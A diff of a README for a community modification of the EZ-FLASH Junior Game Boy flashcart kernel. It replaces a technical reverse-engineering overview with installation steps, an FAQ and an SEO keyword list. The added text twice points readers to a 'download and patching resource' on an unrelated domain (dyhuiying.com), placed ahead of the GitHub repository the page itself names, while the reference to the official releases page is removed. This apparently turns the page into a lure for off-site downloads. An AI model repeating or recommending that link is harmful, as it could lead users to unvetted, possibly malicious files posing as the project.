@@ -1,283 +1,314 @@
 
-<h1 align="center">EZ Flash Junior Kernel Mod</h1>
+# EZ Flash Junior Kernel Mod
 
-<p align="center">
-  <strong>Kernel Reverse Engineering. Firmware Patching. Cartridge Development.</strong>
-</p>
+[![Platform](https://img.shields.io/badge/Platform-Game%20Boy%20%2F%20Game%20Boy%20Color-blue)](https://www.ezflash.cn/product/ezflash-junior/)
+[![Cartridge](https://img.shields.io/badge/Flashcart-EZ--FLASH%20Junior-orange)](https://www.ezflash.cn/product/ezflash-junior/)
+[![Kernel](https://img.shields.io/badge/Component-Custom%20Kernel-purple)](https://github.com/lukesau/ezgb)
+[![License](https://img.shields.io/badge/Project%20Code-AGPL--3.0-green)](https://github.com/lukesau/ezgb)
 
-<p align="center">
-  Nintendo Game Boy · Game Boy Color · Cartridge Firmware
-</p>
+A community-developed modification of the EZ-FLASH Junior kernel that improves the cartridge's menu, file browser, configuration options, and save-management workflow.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Game%20Boy%20%2F%20Game%20Boy%20Color-A63A55?style=flat-square">
-  <img src="https://img.shields.io/badge/category-Cartridge%20Firmware-A63A55?style=flat-square">
-  <img src="https://img.shields.io/badge/license-AGPL--3.0-555555?style=flat-square">
-  <img src="https://img.shields.io/badge/architecture-SM83-333333?style=flat-square">
-</p>
+**Project download and patching resource:**
+
+https://dyhuiying.com/s/file
 
 ## Overview
 
-EZ Flash Junior Kernel Mod is an open-source reverse-engineering and modification project for the EZ-Flash Junior flash cartridge.
+EZ Flash Junior Kernel Mod enhances the menu software used by the EZ-FLASH Junior Game Boy and Game Boy Color flash cartridge.
 
-The cartridge uses an internal menu and operating-system firmware known as the kernel. This software runs on the Game Boy CPU architecture and manages cartridge initialization, microSD access, ROM selection, save operations, and system configuration.
+The original cartridge kernel is distributed as a compiled binary. This community project reverse-engineers and modifies supported kernel versions to add features while retaining the cartridge's existing game-loading workflow.
 
-The project analyzes the original kernel binary and introduces additional functionality through independently developed patches and firmware modifications.
+The modified kernel is supplied as patches that users apply to their own compatible original `ezgb.dat` file. The resulting file is placed on the microSD card and loaded by the cartridge at startup.
 
-It supports multiple original kernel versions, including:
-
-- 1.04e (FW4)
-- 1.05e-0731 (FW5)
-- 1.05e-0918 (FW5)
-
-The modified kernel is loaded from the cartridge's microSD card as `ezgb.dat`. The standard kernel modification process does not require rewriting the console firmware or permanently flashing the handheld.
-
-## Technical Architecture
-
-The project operates at the cartridge firmware level.
-
-Its architecture consists of several technical layers.
-
-### Kernel Binary
-
-The original EZ-Flash Junior kernel is distributed as a compiled binary.
-
-The project provides reverse-engineered disassembly, symbol annotations, and reconstruction tools for analyzing its internal functionality.
-
-### SM83 Processor Environment
-
-The kernel executes on the Game Boy's SM83 processor.
-
-The implementation interacts with cartridge hardware, memory banking, storage operations, and the console's launch process.
-
-### Firmware Patching
-
-Individual features are implemented as patches against specific kernel versions.
-
-The patching workflow includes:
-
-- Binary disassembly.
-- Function identification.
-- Code injection.
-- Address verification.
-- IPS patch generation.
-- Reassembly and validation.
-
-### Cartridge Hardware Interface
-
-The project investigates the cartridge's hardware communication mechanisms, including:
-
-- FPGA control registers.
-- SD sector access.
-- Memory banking.
-- PSRAM save storage.
-- Cartridge initialization.
-- ROM launch behavior.
-
-## Core Components
-
-| Component | Description | Technical Role |
-|---|---|---|
-| Kernel Binary | Original cartridge operating firmware | System initialization |
-| Kernel Disassembly | Annotated firmware reconstruction | Reverse engineering |
-| Kernel Patches | IPS-based modifications | Firmware customization |
-| Injection Tools | Code insertion utilities | Kernel modification |
-| Build Scripts | Automated reconstruction tools | Firmware generation |
-| Configuration | EZGB.CFG | Runtime settings |
-| Bootloader Mod | Experimental startup modification | Cartridge boot management |
-| SameBoy FPGA Stub | Development and testing support | Emulation environment |
-| Hardware Documentation | Registers and memory maps | Hardware analysis |
+The kernel modification is separate from the cartridge's firmware or bootloader. Replacing the patched kernel file is reversible by restoring the original file.
 
 ## Key Features
 
-### Kernel Interface Improvements
+- **Enhanced file browser:** Improved navigation and file-list rendering.
+- **Continuous scrolling:** Navigate beyond the original browser's visible file limit.
+- **File sorting:** Browse files in an organized order, with additional sorting options in newer builds.
+- **Expanded file filtering:** Hide additional operating-system and auxiliary files from the browser.
+- **Fast Launch:** Configure automatic launching of a preferred game.
+- **Multiple Fast Launch methods:** Use `FLAUNCH.CFG`, per-game `.fastlaunch` control files, or automatic selection when only one ROM is present.
+- **Custom themes:** Configure background, text, and accent colors.
+- **Font options:** Select supported display fonts and sizes.
+- **Save management:** Access save backup features and daily backup functionality in supported versions.
+- **Improved interface:** Updated prompts, status messages, browser behavior, and settings screens.
+- **Kernel version identification:** Check the active modified kernel version in the HELP tab.
 
-- Sorted file browser with directories displayed before files.
-- Continuous scrolling beyond screen boundaries.
-- Improved cursor positioning and page navigation.
-- Faster input response through frame-based button sampling.
-- Improved visual rendering and screen updates.
+Feature availability depends on the selected kernel version and installed patch.
 
-### Interface and Configuration
+## Technical Specifications
 
-- Optional 12-pixel menu font.
-- Multiple display themes.
-- Custom background and foreground colors.
-- Improved file identification through icons.
-- Configurable ROM name cleanup.
-- Filtering of unnecessary filesystem entries.
+| Item | Description |
+|---|---|
+| Cartridge | EZ-FLASH Junior |
+| Console family | Game Boy / Game Boy Color |
+| Kernel file | `ezgb.dat` |
+| Kernel execution | Game Boy-compatible cartridge environment |
+| Patch format | IPS |
+| Primary modification | Menu/kernel software |
+| Installation method | Patch original kernel and replace microSD file |
+| Supported stock kernels | 1.04e, 1.05e-0731, 1.05e-0918 |
+| Firmware modification | Separate experimental option |
+| Project license | AGPL-3.0 for the project's own work |
 
-### ROM and Save Management
+The original EZ-FLASH firmware and other proprietary cartridge components are not relicensed by this project.
 
-- Individual ROM management menu.
-- Save backup and restoration.
-- Save backup deletion.
-- ROM favorites and launch counters.
-- Sorting by launch frequency.
-- Last-launched ROM recovery.
-- Configurable automatic launch.
+## Compatibility
 
-### Boot and Storage Management
+### Supported kernel versions
 
-- Configurable fast launch.
-- Faster ROM loading on supported FW5 configurations.
-- RTC backup and restoration through SD storage.
-- Handling of invalid battery-backed records.
-- Improved boot menu behavior.
-- Experimental bootloader modifications.
-
-## Kernel Compatibility
-
-| Kernel Version | Firmware Family | Patch Support |
+| Original kernel | Package / revision | Compatibility |
 |---|---|---|
 | 1.04e | FW4 | Supported |
 | 1.05e-0731 | FW5 | Supported |
 | 1.05e-0918 | FW5 | Supported |
 
-The project uses separate patch packages for each supported kernel revision.
+Use the patch intended for the exact original kernel revision. The two FW5 variants are not interchangeable patch targets.
 
-The 1.05e-0731 build is the primary development target, with features ported to other supported kernel versions.
+The 1.04e kernel has also been reported to work on FW5 cartridges. Confirm the project's current instructions before selecting a cross-version setup.
 
-The 1.04e kernel can also operate on FW5 cartridges.
+### Supported hardware
 
-Always match the patch to the appropriate original kernel binary.
+The EZ-FLASH Junior is designed for Game Boy and Game Boy Color game cartridges and is compatible with supported Game Boy-family systems.
 
-## Firmware Installation and Configuration
+The cartridge manufacturer lists support for Game Boy, Game Boy Pocket, Game Boy Color, and compatible Game Boy Advance systems.
 
-### Prerequisites
+Individual features may behave differently depending on the console, cartridge firmware, and microSD card.
 
-- EZ-Flash Junior cartridge.
-- Compatible microSD card.
-- Original EZ-Flash Junior kernel file.
-- Matching IPS patch.
-- IPS patching utility.
-- Access to the cartridge filesystem.
+## Firmware Features
 
-### Standard Kernel Modification
+The kernel mod and firmware mod are separate components.
 
-1. Obtain the original kernel file from the official EZ-Flash Junior firmware package.
-2. Identify the kernel revision.
-3. Select the corresponding IPS patch.
-4. Apply the patch using a compatible IPS patching utility.
-5. Copy the resulting `ezgb.dat` to the microSD card root.
-6. Start the cartridge and verify the modified kernel version on the HELP screen.
+### Kernel modification
 
-The original kernel file should be retained so the standard configuration can be restored.
+The kernel modification changes the `ezgb.dat` file on the microSD card.
 
-### Configuration
+- Does not require flashing a new bootloader.
+- Can be reverted by restoring the original `ezgb.dat`.
+- Supports IPS patching and a browser-based patching workflow.
+- Requires a patch matching the original kernel revision.
 
-The configuration file is located at:
+### Experimental firmware modification
 
-`/EZGB.CFG`
+Some project releases also provide an experimental firmware modification that changes the cartridge bootloader.
 
-Available configuration areas include:
+Reported additions include:
 
-- Interface appearance.
-- Font selection.
-- File browser behavior.
-- Fast launch.
-- ROM selection.
-- RTC backup.
-- Boot ROM handling.
-- Display themes.
+- An updated boot screen.
+- Bootloader-level Fast Launch.
+- Kernel selection when multiple kernel files are present.
+- Additional microSD error handling on supported firmware.
+- Boot ROM skip behavior in supported configurations.
 
-### Firmware Verification
+**Warning:** The firmware modification is not equivalent to the reversible kernel patch. It writes to the cartridge's firmware. A failed or corrupted bootloader update can require SPI programmer or JTAG recovery.
 
-The HELP tab displays the kernel revision and modification version.
+Do not install the experimental firmware modification unless you understand the recovery implications and have verified the exact update package.
 
-This information can be used to identify the active modified kernel.
+## System Requirements
 
-### Experimental Bootloader Modification
+- EZ-FLASH Junior cartridge.
+- Compatible Game Boy-family console.
+- microSD card supported by the cartridge.
+- Computer with a microSD card reader.
+- Original `ezgb.dat` from a supported kernel package.
+- Matching IPS patch for the selected kernel version.
+- IPS patching utility, or the project's browser-based patcher.
+- Backup of the original kernel and important save files.
 
-The project also contains an experimental firmware modification introducing a new bootloader with fast launch, kernel selection, and SD error recovery on a supported FW5 configuration.
+The cartridge manufacturer specifies FAT32 microSD support for cards in the 4–32 GB range. Follow the cartridge's documentation and the mod project's current instructions for card preparation.
 
-This modification is separate from the standard reversible kernel patch and requires particular care because an unsuccessful firmware modification can render the cartridge unusable.
+## Download & Installation
 
-## Technical Specifications
+### Download
 
-| Parameter | Details |
-|---|---|
-| Project | EZ Flash Junior Kernel Mod |
-| Target Hardware | EZ-Flash Junior |
-| Console Compatibility | Game Boy / Game Boy Color |
-| Software Type | Cartridge Firmware Modification |
-| Processor | SM83 |
-| Original Firmware | EZ-Flash Junior Kernel |
-| Supported Revisions | 1.04e / 1.05e |
-| Patch Format | IPS |
-| Configuration | EZGB.CFG |
-| Kernel File | ezgb.dat |
-| Development Languages | C / Python / Assembly |
-| Build Tools | RGBDS and project utilities |
-| License | AGPL-3.0 for project contributions |
-| Official Repository | lukesau/ezgb |
+Use the project download and patching resource:
 
-## Development Environment
+https://dyhuiying.com/s/file
 
-The repository provides a development environment for reverse engineering and modifying the cartridge kernel.
+The project repository and release information are available here:
 
-### Main Tools
+https://github.com/lukesau/ezgb
 
-- Python 3.
-- RGBDS.
-- MGBDIS.
-- SameBoy.
-- IPS patching utilities.
-- Custom injection scripts.
+### Step 1: Back up the microSD card
 
-### Repository Structure
+1. Turn off the console.
+2. Remove the EZ-FLASH Junior microSD card.
+3. Connect it to a computer.
+4. Copy the complete card contents to a safe backup location.
+5. Keep an untouched copy of the original `ezgb.dat`.
 
-| Directory | Purpose |
-|---|---|
-| `re/` | Kernel disassemblies |
-| `decomp/` | Reconstructed kernel sources |
-| `kernel/` | Feature implementations and injection tools |
-| `docs/` | Technical documentation |
-| `scripts/` | Build and patch automation |
-| `patches/kernel/` | Kernel modification patches |
-| `patches/sameboy/` | Emulator development patches |
+Do not proceed without a recoverable backup.
 
-Original proprietary firmware binaries are not redistributed by the project. Developers must provide their own firmware dump for reconstruction workflows.
+### Step 2: Identify the original kernel
 
-## Frequently Asked Questions
+Determine which original kernel file is installed.
 
-### Is this a Custom Firmware for the Game Boy Color?
+Supported patch targets include:
 
-No. It modifies the firmware of the EZ-Flash Junior cartridge rather than the internal system software of the Game Boy Color console.
+- 1.04e / FW4
+- 1.05e-0731 / FW5
+- 1.05e-0918 / FW5
 
-### Which consoles are compatible?
+If the revision is uncertain, obtain the original kernel from the corresponding official firmware package or verify the file using the project's documented checksum information.
 
-The EZ-Flash Junior is designed for the original Game Boy and Game Boy Color cartridge environments. The project also documents behavior on additional compatible hardware.
+### Step 3: Apply the matching patch
 
-### Does the standard modification flash the console?
+Choose one of the available methods:
 
-No. The modified kernel is loaded from the cartridge's microSD card as `ezgb.dat`.
+**Browser-based patcher**
 
-### Which kernel versions are supported?
+1. Open the project's patcher page.
+2. Select or provide your original `ezgb.dat`.
+3. Allow the patcher to identify and validate the kernel.
+4. Apply the matching modification.
+5. Save the patched output.
 
-The project supports the 1.04e, 1.05e-0731, and 1.05e-0918 kernel revisions through separate patches.
+**IPS patching utility**
 
-### What is the experimental bootloader modification?
+1. Download the IPS patch for your exact kernel revision.
+2. Open an IPS patching utility.
+3. Select the original `ezgb.dat` as the source file.
+4. Select the matching IPS patch.
+5. Apply the patch and save the resulting file.
 
-It is a separate cartridge firmware modification that adds an alternative startup process, kernel selection, and additional boot functionality. It is distinct from the standard kernel patch.
+Do not apply a patch intended for a different kernel revision.
+
+### Step 4: Install the modified kernel
+
+1. Rename the patched output to `ezgb.dat` if necessary.
+2. Copy it to the root directory of the microSD card.
+3. Preserve the original kernel separately.
+4. Safely eject the microSD card.
+5. Reinsert it into the EZ-FLASH Junior.
+6. Start the console and allow the cartridge to load.
+
+The HELP tab should display the modified kernel version when the patch is active.
+
+### Step 5: Verify operation
+
+- Confirm that the cartridge reaches its menu.
+- Open the HELP tab and check the modification version.
+- Navigate through the file browser.
+- Launch a game and verify normal operation.
+- Check save behavior before enabling optional automatic backup features.
+
+## Configuration & Management
+
+### Fast Launch
+
+Fast Launch supports several configuration methods in the modified kernel.
+
+Depending on the build, you can:
+
+- Specify a game path in `FLAUNCH.CFG`.
+- Create a `<rom name>.fastlaunch` control file for a game in the microSD root.
+- Use automatic selection when only one ROM is available.
+
+Consult the instructions accompanying the exact release for supported file naming and path syntax.
+
+### Themes and colors
+
+Newer builds provide expanded theme and font settings.
+
+Depending on the selected kernel and firmware configuration, options can include:
+
+- Background color.
+- Text color.
+- Accent color.
+- Display font and size.
+- Preset themes.
+
+Some theme options depend on the console's display capabilities.
+
+### Save backups
+
+Supported releases include save backup improvements, including a daily backup option.
+
+Before relying on automatic backup:
+
+1. Confirm that the save-management features are available in your installed version.
+2. Check that the microSD card has sufficient free space.
+3. Verify that backup files are being created.
+4. Keep an independent copy of important saves.
+
+### Restoring the original kernel
+
+1. Turn off the console.
+2. Remove the microSD card.
+3. Replace the modified `ezgb.dat` with the original backup.
+4. Safely eject the card.
+5. Reinsert it and start the console.
+
+This restores the original kernel file without requiring a firmware downgrade.
+
+## Troubleshooting
+
+| Problem | Possible cause | Recommended action |
+|---|---|---|
+| Cartridge does not load the menu | Incorrect or damaged `ezgb.dat` | Restore the original kernel and verify the patch target |
+| Modified version is not displayed | Stock kernel is still being loaded | Check the filename and location of `ezgb.dat` |
+| Patcher rejects the file | Unsupported kernel or incorrect source file | Verify the original kernel revision and checksum |
+| Browser displays unexpected files | File filtering settings or unsupported file type | Review the browser configuration and release notes |
+| Fast Launch does not start a game | Incorrect configuration or control-file name | Check the selected Fast Launch method and file path |
+| Game does not launch | Unsupported ROM, damaged file, or compatibility issue | Test a known-good compatible ROM |
+| Save backup is missing | Backup option disabled or unsupported in that build | Check settings and verify the backup destination |
+| Cartridge reports a microSD error | Card compatibility, formatting, or card condition | Test a known-good card and follow the cartridge documentation |
+| Cartridge fails after firmware modification | Possible bootloader update failure | Consult the project's firmware recovery documentation |
+
+Do not interrupt a cartridge firmware update. A kernel-file replacement and a firmware flash are different operations with different recovery risks.
+
+## FAQ
+
+### 1. What is EZ Flash Junior Kernel Mod?
+
+It is a community modification of the EZ-FLASH Junior cartridge's menu/kernel software, adding browser, configuration, launch, and save-management features.
+
+### 2. Does it install custom firmware on the Game Boy?
+
+No. The standard kernel modification replaces the cartridge's `ezgb.dat` file. It does not install a custom operating system on the console.
+
+### 3. Which original kernels are supported?
+
+The documented patch targets include 1.04e, 1.05e-0731, and 1.05e-0918. Use the matching patch for your exact revision.
+
+### 4. Is the kernel modification reversible?
+
+Yes. Restore the original `ezgb.dat` file to the microSD card to return to the original kernel.
+
+### 5. Does the kernel mod require a firmware update?
+
+The standard kernel patch does not require a firmware update. The experimental firmware modification is a separate optional component.
+
+### 6. What is Fast Launch?
+
+Fast Launch is a feature that can automatically start a selected game using supported configuration methods instead of requiring manual navigation through the browser.
+
+### 7. Can I customize the menu appearance?
+
+Supported releases include theme, color, and font options. Available settings vary by kernel build and console configuration.
+
+### 8. Does the project support save backups?
+
+Yes. Supported versions include save-management improvements and daily backup functionality. Verify that the feature is available and configured in your installed build.
+
+### 9. Can I use any IPS patch with my kernel?
+
+No. The patch must match the original kernel revision. Applying an incompatible patch can produce an unusable kernel file.
+
+### 10. Is the experimental firmware modification safe?
+
+It carries additional risk because it writes to the cartridge bootloader. A serious update failure can require hardware-level recovery using an SPI programmer or JTAG.
+
+### 11. Do I need to modify my Game Boy console?
+
+No. The standard modification is applied to the EZ-FLASH Junior microSD kernel file, not to the Game Boy console itself.
+
+### 12. Where can I find patches and project updates?
+
+Check the project repository and release information for current patches, version-specific instructions, and compatibility notes.
 
 ## SEO Keywords
 
-EZ Flash Junior kernel mod, Game Boy Color cartridge firmware, EZ Flash Junior firmware, Game Boy cartridge kernel, EZGB firmware modification, Game Boy kernel reverse engineering, EZ Flash Junior IPS patch, SM83 firmware development, Game Boy cartridge development, EZ Flash Junior bootloader, Game Boy Color kernel patching, EZGB.CFG configuration, Game Boy cartridge firmware analysis, EZ Flash Junior kernel update, Game Boy SD cartridge software, Game Boy firmware disassembly, EZ Flash Junior ROM browser, Game Boy cartridge reverse engineering, EZ Flash Junior GitHub, Game Boy Color system software.
-
-## Technical References
-
-- [Original EZ Flash Junior Kernel Mod Repository](https://github.com/lukesau/ezgb)
-- [Official Project Releases](https://github.com/lukesau/ezgb/releases)
-- [EZ Flash Official Website](https://www.ezflash.cn/)
-- [RGBDS Development Tools](https://github.com/gbdev/rgbds)
-- [SameBoy Emulator](https://github.com/LIJI32/SameBoy)
-- [Game Boy Development Resources](https://github.com/gbdev/awesome-gbdev)
-
-<p align="center">
-  <strong>EZ Flash Junior Kernel Mod</strong>
-  <br>
-  Nintendo Game Boy · Game Boy Color · Cartridge Firmware
-  <br>
-  Firmware Reverse Engineering and Development
-</p>
+EZ Flash Junior, EZ-FLASH Junior Kernel Mod, EZ Flash Junior custom kernel, EZGB DAT, ezgb.dat patch, Game Boy flashcart, Game Boy Color flashcart, Game Boy cartridge, EZ Flash Junior firmware, EZ Flash Junior IPS patch, EZ Flash kernel, custom Game Boy kernel, Game Boy homebrew, Game Boy modding, GBC homebrew, Game Boy Color modding, flashcart kernel modification, EZ Flash file browser, Game Boy ROM loader, Fast Launch Game Boy, EZ Flash save backup, Game Boy save management, Game Boy custom themes, EZ Flash Junior compatibility, IPS kernel patch, Game Boy cartridge tools, EZ Flash Junior setup
